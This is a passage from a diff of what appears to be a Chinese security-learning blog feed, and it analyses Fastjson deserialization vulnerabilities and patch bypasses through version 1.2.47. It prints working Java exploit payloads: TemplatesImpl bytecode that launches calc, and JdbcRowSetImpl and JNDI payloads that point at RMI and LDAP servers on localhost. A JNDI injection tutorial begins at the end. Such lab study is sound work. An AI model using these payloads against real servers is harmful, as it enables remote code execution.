+        String EXP = &quot;{\&quot;@type\&quot;:\&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;,\&quot;_bytecodes\&quot;:[\&quot;yv66vgAAADQANAoACAAkCgAlACYIACcKACUAKAcAKQoABQAqBwArBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAtMdGV4dC9odHRwOwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApFeGNlcHRpb25zBwAtAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAAg8Y2xpbml0PgEAAWUBABVMamF2YS9pby9JT0V4Y2VwdGlvbjsBAA1TdGFja01hcFRhYmxlBwApAQAKU291cmNlRmlsZQEACWh0dHAuamF2YQwACQAKBwAuDAAvADABAARjYWxjDAAxADIBABNqYXZhL2lvL0lPRXhjZXB0aW9uDAAzAAoBAAl0ZXh0L2h0dHABAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACAAAAAAABAABAAkACgABAAsAAAAvAAEAAQAAAAUqtwABsQAAAAIADAAAAAYAAQAAAAsADQAAAAwAAQAAAAUADgAPAAAAAQAQABEAAgALAAAAPwAAAAMAAAABsQAAAAIADAAAAAYAAQAAABgADQAAACAAAwAAAAEADgAPAAAAAAABABIAEwABAAAAAQAUABUAAgAWAAAABAABABcAAQAQABgAAgALAAAASQAAAAQAAAABsQAAAAIADAAAAAYAAQAAAB0ADQAAACoABAAAAAEADgAPAAAAAAABABIAEwABAAAAAQAZABoAAgAAAAEAGwAcAAMAFgAAAAQAAQAXAAgAHQAKAAEACwAAAGEAAgABAAAAErgAAhIDtgAEV6cACEsqtgAGsQABAAAACQAMAAUAAwAMAAAAFgAFAAAADgAJABIADAAQAA0AEQARABMADQAAAAwAAQANAAQAHgAfAAAAIAAAAAcAAkwHACEEAAEAIgAAAAIAIw==\&quot;],\&quot;_tfactory\&quot;:{ },\&quot;_name\&quot;:\&quot;Bloyet\&quot;,\&quot;_outputProperties\&quot;:{}}&quot;;
+        Object TemplateEXP = JSON.parseObject(EXP,Object.class, Feature.SupportNonPublicField);
+    }
+}
+</code></pre>
+<figure data-type="image" tabindex="24"><img src="https://bloyet.github.io/post-images/1749492822158.png" alt="" loading="lazy"></figure>
+<p>但是这里其实是有一些疑问的：</p>
+<p>_bytecodes 原本得是二维数组，但是用二维数组去进行编码会先转换为一维数组在进行编码，这样打不通，需要直接就用一维数组直接编码</p>
+<p>然后就是命名问题，之前在cb链的时候调用getter方法的时候_outputProperties这个属性是不能加下划线的，但是这里又可以，按我的理解是差不多的，都是自动调用getter方法，但是在fastjson里面这里加和不加都是可以打通的，下面这个是cb链的EXP</p>
+<figure data-type="image" tabindex="25"><img src="https://bloyet.github.io/post-images/1749492822173.png" alt="" loading="lazy"></figure>
+<p>ai解释：</p>
+<figure data-type="image" tabindex="26"><img src="https://bloyet.github.io/post-images/1749492822189.png" alt="" loading="lazy"></figure>
+<h1 id="1225-1241绕过">1.2.25-1.2.41绕过</h1>
+<p>先看它是怎么修复这个漏洞的，打的什么补丁</p>
+<p>1.2.24 之后的第一次更新，官方引入<code>checkAutoType</code>机制，默认情况下，autoTypeSupport 关闭，不能直接反序列化任意类。打开<code>AutoType</code>之后是基于黑名单来实现安全检测的，fastjson 也提供了添加黑名单的接口</p>
+<p>之前：</p>
+<figure data-type="image" tabindex="27"><img src="https://bloyet.github.io/post-images/1749492821972.webp" alt="" loading="lazy"></figure>
+<p>更新后：</p>
+<figure data-type="image" tabindex="28"><img src="https://bloyet.github.io/post-images/1749492822205.png" alt="" loading="lazy"></figure>
+<p>发现多了一个checkAutoType方法，步入看看：</p>
+<pre><code class="language-java">public Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass) {
+    if (typeName == null) {
+        return null;
+    } else {
+        String className = typeName.replace('$', '.');
+        if (this.autoTypeSupport || expectClass != null) {
+            int i;
+            String deny;
+            for(i = 0; i &lt; this.acceptList.length; ++i) {
+                deny = this.acceptList[i];
+                if (className.startsWith(deny)) {
+                    return TypeUtils.loadClass(typeName, this.defaultClassLoader);
+                }
+            }
+
+            for(i = 0; i &lt; this.denyList.length; ++i) {
+                deny = this.denyList[i];
+                if (className.startsWith(deny)) {
+                    throw new JSONException(&quot;autoType is not support. &quot; + typeName);
+                }
+            }
+        }
+
+        Class&lt;?&gt; clazz = TypeUtils.getClassFromMapping(typeName);
+        if (clazz == null) {
+            clazz = this.deserializers.findClass(typeName);
+        }
+
+        if (clazz != null) {
+            if (expectClass != null &amp;&amp; !expectClass.isAssignableFrom(clazz)) {
+                throw new JSONException(&quot;type not match. &quot; + typeName + &quot; -&gt; &quot; + expectClass.getName());
+            } else {
+                return clazz;
+            }
+        } else {
+            if (!this.autoTypeSupport) {
+                String accept;
+                int i;
+                for(i = 0; i &lt; this.denyList.length; ++i) {
+                    accept = this.denyList[i];
+                    if (className.startsWith(accept)) {
+                        throw new JSONException(&quot;autoType is not support. &quot; + typeName);
+                    }
+                }
+
+                for(i = 0; i &lt; this.acceptList.length; ++i) {
+                    accept = this.acceptList[i];
+                    if (className.startsWith(accept)) {
+                        clazz = TypeUtils.loadClass(typeName, this.defaultClassLoader);
+                        if (expectClass != null &amp;&amp; expectClass.isAssignableFrom(clazz)) {
+                            throw new JSONException(&quot;type not match. &quot; + typeName + &quot; -&gt; &quot; + expectClass.getName());
+                        }
+
+                        return clazz;
+                    }
+                }
+            }
+
+            if (this.autoTypeSupport || expectClass != null) {
+                clazz = TypeUtils.loadClass(typeName, this.defaultClassLoader);
+            }
+
+            if (clazz != null) {
+                if (ClassLoader.class.isAssignableFrom(clazz) || DataSource.class.isAssignableFrom(clazz)) {
+                    throw new JSONException(&quot;autoType is not support. &quot; + typeName);
+                }
+
+                if (expectClass != null) {
+                    if (expectClass.isAssignableFrom(clazz)) {
+                        return clazz;
+                    }
+
+                    throw new JSONException(&quot;type not match. &quot; + typeName + &quot; -&gt; &quot; + expectClass.getName());
+                }
+            }
+
+            if (!this.autoTypeSupport) {
+                throw new JSONException(&quot;autoType is not support. &quot; + typeName);
+            } else {
+                return clazz;
+            }
+        }
+    }
+}
+</code></pre>
+<p>第一个是开启autoTypeSupport状态</p>
+<p>如果加载的类在白名单上，就直接加载，然后在进行黑名单遍历，如果有就直接报错，没有就正常运行</p>
+<p>一个是关闭autoTypeSupport状态</p>
+<p>先黑名单检查，然后在白名单检查，有就加载，没有就过</p>
+<p>还有一个就是在经历过上面条件之后还没有return走，并且还开启了autoTypeSupport状态的</p>
+<p>直接加载类</p>
+<p>在这三个能类加载的地方，最有可能利用的就是第三个，但是要走到第三个还得走第一个，可以不在白名单上面，但是不能在黑名单上面，这里TypeUtils.loadClass方法，就存在一个漏洞了：</p>
+<figure data-type="image" tabindex="29"><img src="https://bloyet.github.io/post-images/1749492822221.png" alt="" loading="lazy"></figure>
+<p>如果类是L开头，;结尾的就去掉，然后在进行类加载，这里就可以帮助我们绕过黑名单了</p>
+<p>EXP：</p>
+<pre><code class="language-java">package org.example;
+import com.alibaba.fastjson.JSON;
+import com.alibaba.fastjson.parser.ParserConfig;
+
+
+public class JdbcRowSetImplEXP {
+    public static void main(String[] args) {
+        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
+        Object exp=JSON.parseObject(&quot;{\&quot;@type\&quot;:\&quot;Lcom.sun.rowset.JdbcRowSetImpl;\&quot;,\&quot;DataSourceName\&quot;:\&quot;rmi://localhost:1099/Bloyet\&quot;,\&quot;AutoCommit\&quot;:true}&quot;);
+    }
+}
+</code></pre>
+<p>这个EXP是得服务器把autoTypeSupport开启才能利用，但是默认情况下是关闭的</p>
+<h1 id="1242绕过">1.2.42绕过</h1>
+<p>补丁就多了个这个，然后黑名单改为了hash值，防止绕过，但是这个就跟sql注入一样，它是直接把传入的类名直接进行检查，如果是L开头，;结尾的直接删除，然后在</p>
+<p>类加载的函数里面逻辑是不变的，那我们直接双写绕过就行</p>
+<figure data-type="image" tabindex="30"><img src="https://bloyet.github.io/post-images/1749492822237.png" alt="" loading="lazy"></figure>
+<p>EXP：</p>
+<pre><code class="language-java">package org.example;
+import com.alibaba.fastjson.JSON;
+import com.alibaba.fastjson.parser.ParserConfig;
+
+
+public class JdbcRowSetImplEXP {
+    public static void main(String[] args) {
+        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
+        Object exp=JSON.parseObject(&quot;{\&quot;@type\&quot;:\&quot;LLcom.sun.rowset.JdbcRowSetImpl;;\&quot;,\&quot;DataSourceName\&quot;:\&quot;rmi://localhost:1099/Bloyet\&quot;,\&quot;AutoCommit\&quot;:true}&quot;);
+    }
+}
+</code></pre>
+<h1 id="1243绕过">1.2.43绕过</h1>
+<p>多了个对类名双写LL检测，发现是LL直接报错</p>
+<figure data-type="image" tabindex="31"><img src="https://bloyet.github.io/post-images/1749492822252.png" alt="" loading="lazy"></figure>
+<p>但是还是可以绕过，在我们类名前面先设置为[,让它认为是数组类型，然后去掉[，重新进行类加载，那么&quot;后面的[{是干嘛的？</p>
+<p><code>thisObj = deserializer.deserialze(this, clazz, fieldName);</code> 紧接着进入正常的反序列化流程，使用<code>ObjectArrayCodec</code>类型的反序列化器进行反序列化，其中会提取数组中的成员类型并使用<code>parser.parseArray</code> 进行解析</p>
+<figure data-type="image" tabindex="32"><a href="https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/FastjsonBypass/6.png"><img src="https://bloyet.github.io/post-images/1749492822283.png" alt="" loading="lazy"></a></figure>
+<p>当前token不为14时，即会判断是否为<code>&quot;[&quot;</code> ，如果不是会抛出异常；</p>
+<pre><code class="language-java">if (token != 14) {
+    throw new JSONException(&quot;exepct '[', but &quot; + JSONToken.name(token) + &quot;, &quot; + this.lexer.info());
+} else {
+</code></pre>
+<p>当前token不为12 或者 16时，即会判断是否为<code>&quot;{&quot;</code> 或者 <code>&quot;,&quot;</code>，会在进入if流程后抛出异常，下面有一个char和token的对照关系；</p>
+<pre><code class="language-java">if (token != 12 &amp;&amp; token != 16) {
+...
+if (token == 14 &amp;&amp; lexer.getCurrent() == ']') {
+    lexer.next();
+    lexer.nextToken();
+    typeKey = null;
+    return typeKey;
+} else {
+    StringBuffer buf = (new StringBuffer()).append(&quot;syntax error, expect {, actual &quot;).append(lexer.tokenName()).append(&quot;, pos &quot;).append(lexer.pos());
+    if (fieldName instanceof String) {
+        buf.append(&quot;, fieldName &quot;).append(fieldName);
+    }
+
+    buf.append(&quot;, fastjson-version &quot;).append(&quot;1.2.43&quot;);
+    throw new JSONException(buf.toString());
+}
+
+// fastjson-1.2.43.jar!/com/alibaba/fastjson/parser/JSONLexerBase.class
+this.ch == ',' this.token = 16
+this.ch == '[' this.token = 14
+this.ch == '{' this.token = 12
+this.ch == '\'' this.token = 4
+</code></pre>
+<p>因此依次满足上面的条件即可触发payload，有个问题是为什么<code>&quot;{&quot;</code>在逗号前后都能触发，解析过程中判断到当前字符为16，也就是逗号时，会直接跳过该字符，进入下一个字符的处理，因此在<code>&quot;[&quot;</code>后无论是先写逗号还是<code>&quot;{&quot;</code>，最终都是解析<code>&quot;{&quot;</code>字符</p>
+<pre><code class="language-java">if (this.lexer.isEnabled(Feature.AllowArbitraryCommas)) {
+    while(this.lexer.token() == 16) {
+        this.lexer.nextToken();
+    }
+}
+</code></pre>
+<figure data-type="image" tabindex="33"><img src="https://bloyet.github.io/post-images/1749492822268.png" alt="" loading="lazy"></figure>
+<pre><code class="language-java">package org.example;
+import com.alibaba.fastjson.JSON;
+import com.alibaba.fastjson.parser.ParserConfig;
+
+
+public class JdbcRowSetImplEXP {
+    public static void main(String[] args) {
+        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
+        Object exp=JSON.parseObject(&quot;{\&quot;@type\&quot;:\&quot;[com.sun.rowset.JdbcRowSetImpl\&quot;[{,\&quot;DataSourceName\&quot;:\&quot;rmi://localhost:1099/Bloyet\&quot;,\&quot;AutoCommit\&quot;:true}&quot;);
+    }
+}
+</code></pre>
+<p>所以这个payload也是一条全新的绕过思路，在前面的版本都是可以用这个payload打的</p>
+<h1 id="1245绕过">1.2.45绕过</h1>
+<p>这个版本添加了一些黑名单，但是补充还是不全，如果服务器存在mybatis组件，版本为3.0.1 ≤ 版本 ≤ 3.4.6，可以进行利用</p>
+<figure data-type="image" tabindex="34"><img src="https://bloyet.github.io/post-images/1749492822300.png" alt="" loading="lazy"></figure>
+<p>符合set方法调用，而且还一lookup方法，并且参数也可以控制，这里很有意思啊，我们看看是怎么控制这个参数的</p>
+<pre><code class="language-java">package org.example;
+import com.alibaba.fastjson.JSON;
+import com.alibaba.fastjson.parser.ParserConfig;
+
+
+public class EXP {
+    public static void main(String[] args) {
+
+        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
+
+        Object exp=JSON.parseObject(&quot;{\&quot;@type\&quot;:\&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\&quot;,\&quot;properties\&quot;:{\&quot;data_source\&quot;:\&quot;rmi://localhost:1099/Bloyet\&quot;}}&quot;);
+        System.out.println(exp);
+    }
+}
+</code></pre>
+<p>我们知道在fastjson中自动调用set方法的时候，会把properties后面的当做参数进行传入， 这里并且还是为Properties类型，走到下面调用lookup方法，方法里面还会调用properties.getProperty(DATA_SOURCE)，DATA_SOURCE这个值默认是data_source，那我们跟进这个方法看看：</p>
+<figure data-type="image" tabindex="35"><img src="https://bloyet.github.io/post-images/1749492822314.png" alt="" loading="lazy"></figure>
+<p>我们看到这个方法，他就是根据传入的kay来查找内容，它默认是查找data_source，我们的payload里面设置的data_source的值就是rmi要的值，那就直接进行漏洞利用了</p>
+<figure data-type="image" tabindex="36"><img src="https://bloyet.github.io/post-images/1749492822330.png" alt="" loading="lazy"></figure>
+<h1 id="1247绕过">1.2.47绕过</h1>
+<p>这个版本爆出了很严重的漏洞，可以说是低于1.2.47版本的通杀了</p>
+<p>利用条件：</p>
+<p>1.2.25-1.2.32版本：未开启AutoTypeSupport时能成功利用，开启AutoTypeSupport反而不能成功触发；<br>
+1.2.33-1.2.47版本：无论是否开启AutoTypeSupport，都能成功利用；</p>
+<p>问题还是出在checkAutoType</p>
+<pre><code class="language-java">public Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass, int features) {
+        ...
+        //前面是对typeName格式的各种检测，这里我们暂时跳过
+ 
+        //开启autoTypeSupport，则进入白名单+黑名单检测
+        if (autoTypeSupport || expectClass != null) {
+            long hash = h3;
+            for (int i = 3; i &lt; className.length(); ++i) {
+                hash ^= className.charAt(i);
+                hash *= PRIME;
+ 
+                //白名单检测，这里我们无法绕过
+                if (Arrays.binarySearch(acceptHashCodes, hash) &gt;= 0) {
+                    clazz = TypeUtils.loadClass(typeName, defaultClassLoader, false);
+                    if (clazz != null) {
+                        return clazz;
+                    }
+                }
+                
+                //黑名单检测，可以看到这里多了一个从Mapping中寻找类名的判断，绕过的关键就在这里
+                if (Arrays.binarySearch(denyHashCodes, hash) &gt;= 0 &amp;&amp; TypeUtils.getClassFromMapping(typeName) == null) {
+                    throw new JSONException(&quot;autoType is not support. &quot; + typeName);
+                }
+            }
+        }
+ 
+        if (clazz == null) {
+            //从Mapping缓冲中加载类
+            clazz = TypeUtils.getClassFromMapping(typeName);
+        }
+ 
+        if (clazz == null) {
+            //从deserializer中加载类
+            clazz = deserializers.findClass(typeName);
+        }
+ 
+        if (clazz != null) {
+            if (expectClass != null
+                    &amp;&amp; clazz != java.util.HashMap.class
+                    &amp;&amp; !expectClass.isAssignableFrom(clazz)) {
+                throw new JSONException(&quot;type not match. &quot; + typeName + &quot; -&gt; &quot; + expectClass.getName());
+            }
+            //通过上面两个方法加载类后返回
+            return clazz;
+        }
+        
+        //默认开启白名单的情况
+        if (!autoTypeSupport) {
+            long hash = h3;
+            for (int i = 3; i &lt; className.length(); ++i) {
+                char c = className.charAt(i);
+                hash ^= c;
+                hash *= PRIME;
+ 
+                //黑名单校验
+                if (Arrays.binarySearch(denyHashCodes, hash) &gt;= 0) {
+                    throw new JSONException(&quot;autoType is not support. &quot; + typeName);
+                }
+                
+                //白名单校验
+                if (Arrays.binarySearch(acceptHashCodes, hash) &gt;= 0) {
+                    if (clazz == null) {
+                        clazz = TypeUtils.loadClass(typeName, defaultClassLoader, false);
+                    }
+ 
+                    if (expectClass != null &amp;&amp; expectClass.isAssignableFrom(clazz)) {
+                        throw new JSONException(&quot;type not match. &quot; + typeName + &quot; -&gt; &quot; + expectClass.getName());
+                    }
+ 
+                    return clazz;
+                }
+            }
+        }
+ 
+        if (clazz == null) {
+            clazz = TypeUtils.loadClass(typeName, defaultClassLoader, false);
+        }
+ 
+        ...
+ 
+        return clazz;
+    }
+</code></pre>
+<p>如果服务器开启了autoTypeSupport，就先白名单，然后在进行黑名单，但是这里多了一个判断，如果仅仅是黑名单匹配到了还不行，还要去查找是否有这个类的缓存，如果没有才会爆异常，所以如果可以把我们想要的恶意类写入缓存中，就可以避免被黑名单匹配掉，然后程序没有报错，继续往下走，发现它直接从Mapping中读取类，然后进行加载了。所以说不管你有没有开启autoTypeSupport，按照代码的执行顺序来说，只要我们把恶意类写入了缓存中，就可以实现类加载（如果可以成功读取并加载，然后就会return走了，根本就走不到下面的if判断）</p>
+<p>所以现在就是看怎么把恶意类写入缓存中</p>
+<p>我们先从取出的方法来看 TypeUtils.getClassFromMapping 和 deserializers.findClass</p>
+<p>TypeUtils.getClassFromMapping：</p>
+<figure data-type="image" tabindex="37"><img src="https://bloyet.github.io/post-images/1749492822346.png" alt="" loading="lazy"></figure>
+<p>这里是从mapping中取值出来，写入的方法在哪呢？</p>
+<p>其实写入的方法就在 TypeUtils.loadClass</p>
+<pre><code class="language-java"> public static Class&lt;?&gt; loadClass(String className, ClassLoader classLoader, boolean cache) {
+ 
+        ...
+        //对类名进行检查和判断
+        try{
+            //第一处，classLoader不为null
+            if(classLoader != null){
+                clazz = classLoader.loadClass(className);
+ 
+                //如果chche为true，则将我们输入的className缓存入mapping中
+                if (cache) {
+                    mappings.put(className, clazz);
+                }
+                return clazz;
+            }
+        } catch(Throwable e){
+            e.printStackTrace();
+            // skip
+        }
+        try{
+            ClassLoader contextClassLoader = Thread.currentThread().getContextClassLoader();
+ 
+            //第二处，检查较为严格
+            if(contextClassLoader != null &amp;&amp; contextClassLoader != classLoader){
+                clazz = contextClassLoader.loadClass(className);
+ 
+                //如果chche为true，则将我们输入的className缓存入mapping中
+                if (cache) {
+                    mappings.put(className, clazz);
+                }
+                return clazz;
+            }
+        } catch(Throwable e){
+            // skip
+        }
+ 
+        //第三处，限制宽松，但
+        try{
+            clazz = Class.forName(className);
+            mappings.put(className, clazz);
+            return clazz;
+        } catch(Throwable e){
+            // skip
+        }
+        return clazz;
+    }
+</code></pre>
+<p>那么现在就是看看那里还有调用loadClass方法，TypeUtils.loadClass是有三个重载的，最后都是会到上面这个loadClass方法的，我们在两个参数的loadClass方法中找到了调用（两个参数的，刚好chche为true，虽然一个参数的也是会先来到两个参数的，然后在去三个参数的方法）</p>
+<figure data-type="image" tabindex="38"><img src="https://bloyet.github.io/post-images/1749492822360.png" alt="" loading="lazy"></figure>
+<p>在MiscCodec#deserialze方法中</p>
+<p>strVal这个参数就是我们要加载的类（className），我们看怎么控制它的值</p>
+<figure data-type="image" tabindex="39"><img src="https://bloyet.github.io/post-images/1749492822376.png" alt="" loading="lazy"></figure>
+<p>要给strVal赋值，就要objVal不为空，并且objVal的值赋给strVal，那么现在就是看objVal怎么赋值的</p>
+<figure data-type="image" tabindex="40"><img src="https://bloyet.github.io/post-images/1749492822391.png" alt="" loading="lazy"></figure>
+<p>if判断默认是true的（是因为在后续的 parseObject 方法中会将<code>resolveStatus</code>设置为<code>TypeNameRedirect</code>），然后判断json字符串中是否有val键，等等一系列要求，然后就会把val的值解析返回给objVal中</p>
+<figure data-type="image" tabindex="41"><img src="https://bloyet.github.io/post-images/1749492822407.png" alt="" loading="lazy"></figure>
+<p>然后就是只要我们把这个写入进去，我们在去正常加载就不会被黑名单匹配掉了，看payload怎么写：</p>
+<p>首先把它写入缓存</p>
+<pre><code class="language-java">{
+//满足clazz为Class.class
+&quot;@type&quot;:&quot;java.lang.Class&quot;,
+ 
+//有val，且值为我们要写入mapping的恶意类
+&quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;
+}
+</code></pre>
+<p>然后就是正常的：</p>
+<pre><code class="language-java">{    
+    &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,
+    &quot;dataSourceName&quot;:&quot;ldap://127.0.0.1:8000/Bloyet&quot;,
+    &quot;autoCommit&quot;:&quot;true&quot;
+}
+</code></pre>
+<p>合起来：</p>
+<pre><code class="language-java">{
+    &quot;1&quot;: {
+        &quot;@type&quot;: &quot;java.lang.Class&quot;,
+        &quot;val&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;
+    },
+    &quot;2&quot;: {
+        &quot;@type&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;,
+        &quot;dataSourceName&quot;: &quot;ldap://127.0.0.1:1099/Bloyet&quot;,
+        &quot;autoCommit&quot;: true
+    }
+}
+</code></pre>
+<p>EXP:</p>
+<pre><code class="language-java">package org.example;
+
+import com.alibaba.fastjson.JSON;
+
+public class EXP_tongsha {
+    public static void main(String[] args) {
+       Object  EXP = JSON.parseObject(&quot;{\n&quot; +
+               &quot;    \&quot;1\&quot;: {\n&quot; +
+               &quot;        \&quot;@type\&quot;: \&quot;java.lang.Class\&quot;,\n&quot; +
+               &quot;        \&quot;val\&quot;: \&quot;com.sun.rowset.JdbcRowSetImpl\&quot;\n&quot; +
+               &quot;    },\n&quot; +
+               &quot;    \&quot;2\&quot;: {\n&quot; +
+               &quot;        \&quot;@type\&quot;: \&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\n&quot; +
+               &quot;        \&quot;dataSourceName\&quot;: \&quot;rmi://127.0.0.1:1099/Bloyet\&quot;,\n&quot; +
+               &quot;        \&quot;autoCommit\&quot;: true\n&quot; +
+               &quot;    }\n&quot; +
+               &quot;}&quot;);
+    }
+}
+</code></pre>
+<p>好文章：</p>
+<p><a href="https://drops.blbana.cc/2020/04/16/Fastjson%E5%8E%86%E5%8F%B2%E8%A1%A5%E4%B8%81Bypass%E5%88%86%E6%9E%90/#%E7%BB%95%E8%BF%87%E5%8E%9F%E5%9B%A0-2">Fastjson历史补丁Bypass分析 · BlBana’s BlackHouse</a></p>
+<p>[Fastjson 反序列化漏洞 · 攻击Java Web应用-<a href="https://www.javasec.org/java-vuls/FastJson.html">Java Web安全]</a></p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[JNDI注入]]></title>
+        <id>https://bloyet.github.io/post/jndi-zhu-ru/</id>
+        <link href="https://bloyet.github.io/post/jndi-zhu-ru/">
+        </link>
+        <updated>2025-06-09T17:56:24.000Z</updated>
+        <content type="html"><![CDATA[<p>参考文献：</p>
+<p><a href="https://goodapple.top/archives/696">Java安全学习——JNDI注入 - 枫のBlog</a></p>
+<p><a href="https://stoocea.github.io/post/JNDIRe0.html#%E4%BB%80%E4%B9%88%E6%98%AF-JNDI">JNDI重看 | stoocea’s blog</a></p>
+<h1 id="jndi简述">JNDI简述</h1>
+<p>JNDI（Java Naming and Directory Interface，Java命名和目录接口）是SUN公司提供的一种标准的Java命名系统接口。JNDI提供统一的客户端API，并由管理者将JNDI API映射为特定的<strong>命名服务</strong>和<strong>目录服务</strong>，为开发人员查找和访问各种资源提供了统一的通用接口，可以用来定义用户、网络、机器、对象和服务等各种资源。简单来说，开发人员通过合理的使用JNDI，能够让用户通过统一的方式访问获取网络上的各种资源和服务</p>
+<h2 id="命名服务naming-server">命名服务（Naming Server）</h2>
+<p>命名服务，简单来说，就是一种通过名称来查找实际对象的服务。比如我们的RMI协议，可以通过名称来查找并调用具体的远程对象。再比如我们的DNS协议，通过域名来查找具体的IP地址。这些都可以叫做命名服务。</p>
+<p>在命名服务中，有几个重要的概念。</p>
+<ul>
+<li><strong>Bindings</strong>：表示一个名称和对应对象的绑定关系，比如在在 DNS 中域名绑定到对应的 IP，在RMI中远程对象绑定到对应的name,文件系统中文件名绑定到对应的文件。</li>
+<li><strong>Context</strong>：上下文，一个上下文中对应着<strong>一组名称到对象的绑定关系</strong>，我们可以在指定上下文中查找名称对应的对象。比如在文件系统中，一个目录就是一个上下文，可以在该目录中查找文件，其中子目录也可以称为子上下文 (SubContext)。</li>
+<li><strong>References</strong>：在一个实际的名称服务中，有些对象可能无法直接存储在系统内，这时它们便以引用的形式进行存储，可以理解为 C/C++ 中的指针。引用中包含了获取实际对象所需的信息，甚至对象的实际状态。比如文件系统中实际根据名称打开的文件是一个整数 fd (file descriptor)，这就是一个引用，内核根据这个引用值去找到磁盘中的对应位置和读写偏移。</li>
+</ul>
+<h2 id="目录服务directory-service">目录服务（Directory Service）</h2>
+<p>简单来说，目录服务是命名服务的扩展，除了名称服务中已有的名称到对象的关联信息外，还允许对象拥有属性（Attributes）信息。由此，我们不仅可以根据名称去查找（Lookup）对象(并获取其对应属性)，还可以根据属性值去搜索（Search）对象。</p>
+<p>一些常见的目录服务有：</p>
+<ul>
+<li>LDAP： 轻型目录访问协议</li>
+<li>Active Directory: 为 Windows 域网络设计，包含多个目录服务，比如域名服务、证书服务等；</li>
+<li>其他基于 X.500 (目录服务的标准) 实现的目录服务；</li>
+</ul>
+<h2 id="jndi-spi">JNDI SPI</h2>
+<p>JNDI 架构上主要包含两个部分，即 Java 的应用层接口和 SPI，如下图所示</p>
+<figure data-type="image" tabindex="1"><img src="https://bloyet.github.io/post-images/1749492628850.png" alt="" loading="lazy"></figure>
+<p>SPI（Service Provider Interface），即服务供应接口，主要作用是为底层的具体目录服务提供统一接口，从而实现目录服务的可插拔式安装。</p>
+<p>JDK 中包含了下述内置的命名目录服务:</p>
+<ul>
+<li>RMI: Java Remote Method Invocation，Java 远程方法调用</li>
+<li>LDAP: 轻量级目录访问协议</li>
+<li>CORBA: Common Object Request Broker Architecture，通用对象请求代理架构，用于 COS 名称服务(Common Object Services)</li>
+<li>DNS（域名转换协议）</li>
+</ul>
+<p>除此之外，用户还可以在 Java 官网下载其他目录服务实现。由于 SPI 的统一接口，厂商也可以提供自己的私有目录服务实现，用户无需重复修改代码。</p>
+<h1 id="jndi代码示例">JNDI代码示例</h1>
+<p>JNDI 接口主要分为下述 5 个包:</p>
+<ul>
+<li><code>javax.naming</code>：主要用于命名操作，它包含了命名服务的类和接口，该包定义了Context接口和InitialContext类</li>
+<li><code>javax.naming.directory</code>：主要用于目录操作，它定义了DirContext接口和InitialDir-Context类</li>
+<li><code>javax.naming.event</code>：在命名目录服务器中请求事件通知</li>
+<li><code>javax.naming.ldap</code>：提供LDAP服务支持</li>
+<li><code>javax.naming.spi</code>：允许动态插入不同实现，为不同命名目录服务供应商的开发人员提供开发和实现的途径，以便应用程序通过JNDI可以访问相关服务</li>
+</ul>
+<p>下面我们通过具体代码来看看JNDI是如何实现与各服务进行交互的。</p>
+<h2 id="jndirmi">JNDI+RMI</h2>
+<h3 id="rmi接口">RMI接口：</h3>
+<pre><code class="language-java">package org.example;
+
+import java.rmi.Remote;
+import java.rmi.RemoteException;
+
+public interface Remoteobj extends Remote {
+    public String sayHello(String kaywords) throws RemoteException;
+    
+}
+</code></pre>
+<h3 id="rmi远程对象实现类">RMI远程对象（实现类）</h3>
+<pre><code class="language-java">package org.example;
+
+import java.rmi.RemoteException;
+import java.rmi.server.UnicastRemoteObject;
+
+public class RemoteobjImpl extends UnicastRemoteObject implements Remoteobj {
+    protected RemoteobjImpl() throws RemoteException {
+    }
+
+    @Override
